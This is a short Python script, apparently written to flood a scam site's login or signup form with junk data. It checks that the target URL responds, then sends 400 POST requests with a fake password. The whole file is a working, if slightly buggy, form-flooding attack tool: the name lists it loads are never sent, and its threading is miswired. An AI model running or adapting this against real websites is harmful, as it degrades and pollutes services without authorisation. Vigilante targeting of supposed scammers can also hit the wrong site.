# v0.1.0
from threading import Thread

import requests as req
import random
import json
import argparse

#process command line arguements
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="URL of the target site")
args = parser.parse_args()

if args.url:
    url = args.url

# Check the response code of the server
def scanner(URL):
    scan = URL
    r = req.get(scan)
    return r.status_code

# Flood the database with false data.
def takedown(URL):
    runURL = URL
    data = open('first-names.json')
    NameFileData = json.load(data)
    
    fname = random.choice(NameFileData)     # Declare the variable in data if the form requires a first name
    lname = random.choice(NameFileData)     # Declare the variable in data if the form requires a last name

    for i in range(400):
        with req.session() as ses:
            # put params here
            data = {
                "passwd": "shiddyScammer"
            }
            takedown = ses.post(runURL, data)
            
            if takedown.status_code == 200:
                print("[Remote Server]: 200")
                continue
            else:
                print("[Remote Surver]: " + takedown.status_code)
                break

# Check if server response code is equal to 200, if so run takedown(). Anything else will result in an error.
def runtime(URL):
    runURL = URL

    if scanner(runURL) == 200:
        print('good')
        takedown(runURL)
    else:
        print("Bad url")

t1 = Thread(target=runtime(url))
t1.start()
t1.join()
